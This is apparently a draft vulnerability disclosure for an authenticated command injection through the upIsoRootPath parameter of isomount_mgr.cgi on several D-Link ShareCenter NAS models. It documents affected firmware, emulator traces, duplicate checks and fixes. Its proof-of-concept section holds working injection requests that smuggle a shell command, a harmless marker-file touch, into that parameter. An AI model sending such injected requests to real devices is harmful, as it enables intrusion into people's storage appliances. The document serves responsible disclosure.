# Vulnerability Submission: D-Link DNS-340L / DNS-345 isomount_mgr.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-003 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-320L ShareCenter; DNS-327L ShareCenter; DNS-340L ShareCenter; DNS-345 ShareCenter |
| Confirmed Firmware Versions | DNS-320L REVA 1.10B03; DNS-327L REVA 1.10B02; DNS-340L REVA 1.01B04; DNS-345 REVA 1.01, 1.03B06, 1.04.B02, 1.05b04 HOTFIX |
| Confirmed Firmware Images | dlink-DNS__DNS-320L_REVA_FIRMWARE_v1.10B03.zip; dlink-DNS__DNS-327L_REVA_FIRMWARE_v1.10B02.zip; dlink-DNS__DNS-340L_REVA_FIRMWARE_1.01B04.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.01.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.03B06.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.04.B02.ZIP; dlink-DNS__DNS-345_REVA_FIRMWARE_1.05b04_HOTFIX.ZIP |
| Affected Binary | cgi/isomount_mgr.cgi |
| Web Endpoint | /cgi-bin/isomount_mgr.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-320L 1.10B03: 4e1ac92af585f2915c389cad632c9c149485ba28; DNS-327L 1.10B02: bfbb4391e781e7a3d3bf3af1d952b086cf9de147; DNS-340L 1.01B04: 1230757ceb7bd65fed95001dabf94335605972ba; DNS-345 1.01: 06202d6398208dc69c67a63bf541553af5b57316; DNS-345 1.03B06/1.04.B02/1.05b04 HOTFIX: ff0a43abde79d66eec0474f734fc6a505ce26804 |

## Description

The `isomount_mgr.cgi` CGI handler accepts ISO image management parameters from the authenticated web interface. In the `cgi_iso_create_image` and `cgi_iso_size` branches, the `upIsoRootPath` parameter is inserted directly into a shell command that invokes `genisoimage`.

Runtime tracing shows the vulnerable command shape:

```text
genisoimage <options> <upIsoRootPath>/<fileName> 2>/dev/null
```

Because this command is executed through `/bin/sh -c`, an authenticated web attacker can inject shell metacharacters in `upIsoRootPath` and execute arbitrary commands as the CGI process user.

Frontend reachability review shows the ISO management UI loads `iso_create.js` from `management.html`, exposes a `Create ISO Image` button in the Network Access / ISO Mount Share Settings panel, and sends POST requests to `/cgi-bin/isomount_mgr.cgi` for `cmd=cgi_iso_config`, `cmd=cgi_iso_create_image`, and `cmd=cgi_iso_size`. The UI gates the workflow through `login_mgr.cgi` `cmd=ui_check_wto`, supporting the authenticated-management-interface impact model.

## Impact

Successful exploitation allows authenticated remote command execution on affected NAS appliances. The attacker can create or modify files, alter NAS configuration, access stored data through local commands, disrupt service availability, or use the device as a foothold inside the local network.

This draft treats the issue as authenticated management-interface RCE. The finding is separate from known D-Link NAS command-injection advisories for other CGI endpoints because the verified sink is `isomount_mgr.cgi` ISO creation/size handling through `upIsoRootPath`.

## Proof of Concept

Low-impact marker examples:

```http
POST /cgi-bin/isomount_mgr.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_iso_create_image&fileName=img&upIsoRootPath=/mnt/HD/HD_a2/iso/img;touch /tmp/DLINK_CMD_003_create.hit;#
```

```http
POST /cgi-bin/isomount_mgr.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_iso_size&fileName=img&upIsoRootPath=/mnt/HD/HD_a2/iso/img;touch /tmp/DLINK_CMD_003_size.hit;#
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_isomount_branch_params_20260526.py`
- `inout/reports/0day_verification_20260526/isomount_branch_params_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/isomount_branch_params_triage_20260526.md`
- `inout/reports/0day_verification_20260526/isomount_reachability_auth_csrf_20260526.md`
- `inout/reports/0day_verification_20260526/isomount_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/isomount_duplicate_check_20260526.md`

Runtime summary:

| Firmware | Binary SHA1 | Marker hits | Controlled shell traces |
|----------|-------------|-------------|-------------------------|
| DNS-320L 1.10B03 | 4e1ac92af585f2915c389cad632c9c149485ba28 | 2 | 2 |
| DNS-327L 1.10B02 | bfbb4391e781e7a3d3bf3af1d952b086cf9de147 | 2 | 2 |
| DNS-340L 1.01B04 | 1230757ceb7bd65fed95001dabf94335605972ba | 2 | 2 |
| DNS-345 1.01 | 06202d6398208dc69c67a63bf541553af5b57316 | 2 | 2 |
| DNS-345 1.03B06 | ff0a43abde79d66eec0474f734fc6a505ce26804 | 2 | 2 |
| DNS-345 1.04.B02 | ff0a43abde79d66eec0474f734fc6a505ce26804 | 2 | 2 |
| DNS-345 1.05b04 HOTFIX | ff0a43abde79d66eec0474f734fc6a505ce26804 | 2 | 2 |

The verifier repairs zero-filled symlink placeholders in temporary qemu sysroots only, including busybox applet links and libc soname links. This restored the runtime environment for DNS-320L 1.10B03, DNS-327L 1.10B02, and DNS-345 1.04.B02 and converted their earlier trace-only boundary status into marker-confirmed affected evidence.

Representative qemu strace evidence:

DNS-345 1.03B06:

```text
execve("/bin/sh",{"sh","-c","genisoimage   /mnt/HD/HD_a2/iso/img;touch /tmp/FIRMREC_DNS345_103B06_ISOMOUNT_20260526_create_image_root.hit;#/img 2>/dev/null",NULL})
```

DNS-340L 1.01B04:

```text
execve("/bin/sh",{"sh","-c","genisoimage   /mnt/HD/HD_a2/iso/img;touch /tmp/FIRMREC_DNS340L_101B04_ISOMOUNT_20260526_create_image_root.hit;#/img 2>/dev/null",NULL})
```

Marker files were created in the temporary qemu sysroots for both `cgi_iso_create_image` and `cgi_iso_size` cases on each confirmed affected firmware, for 14 marker hits across 7 tested firmware images.

## Public Duplicate Check

Public duplicate checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link `isomount_mgr.cgi` command injection through `cgi_iso_create_image`, `cgi_iso_size`, or `upIsoRootPath`.

NVD API checks:

| Query | Result |
|-------|--------|
| `isomount_mgr.cgi` | 0 CVE records |
| `cgi_iso_create_image` | 0 CVE records |
| `cgi_iso_size` | 0 CVE records |
| `upIsoRootPath` | 0 CVE records |
| `D-Link upIsoRootPath` | 0 CVE records |
| `D-Link isomount_mgr.cgi command injection` | 0 CVE records |
| `DNS-320L isomount_mgr.cgi` | 0 CVE records |
| `DNS-327L isomount_mgr.cgi` | 0 CVE records |
| `DNS-345 isomount_mgr.cgi` | 0 CVE records |
| `DNS-340L isomount_mgr.cgi` | 0 CVE records |
| `DNS-320L upIsoRootPath` | 0 CVE records |
| `DNS-327L upIsoRootPath` | 0 CVE records |
| `DNS-340L upIsoRootPath` | 0 CVE records |
| `DNS-345 upIsoRootPath` | 0 CVE records |
| `genisoimage D-Link command injection` | 0 CVE records |

Broader `D-Link DNS-320L/DNS-327L/DNS-340L/DNS-345 command injection` searches return known D-Link NAS command-injection prior art for other endpoints such as `photocenter_mgr.cgi`, `nas_sharing.cgi`, `webfile_mgr.cgi`, and other media/share handlers. Those are relevant prior art but are not direct duplicates of the verified `isomount_mgr.cgi` `upIsoRootPath` command path.

Manual web search terms also checked:

```text
"isomount_mgr.cgi" "D-Link" vulnerability
"cgi_iso_create_image" "D-Link" vulnerability
"upIsoRootPath" "D-Link"
"isomount_mgr.cgi" "command injection"
```

Search results surfaced broad D-Link NAS prior art and a SEARCH-LAB report mentioning `isomount_mgr.cgi` in CGI/access-control context, but no exact `cgi_iso_create_image` / `upIsoRootPath` / `genisoimage` command-injection duplicate was observed. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus branch-aware runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI probes in restored D-Link DNS rootfs images under qemu-arm-static with command markers |

## Suggested Fix

1. Replace shell-based `system()` calls with argument-vector APIs such as `execve()` that do not invoke `/bin/sh`.
2. Treat ISO paths and names as filesystem paths, not shell fragments; canonicalize them and enforce an allowlist rooted under expected volume paths.
3. Reject metacharacters, command substitutions, unexpected whitespace, and path traversal sequences in `upIsoRootPath`, `fileName`, and related ISO-management parameters.
4. Add server-side authorization checks and CSRF protection for ISO creation and size-calculation actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
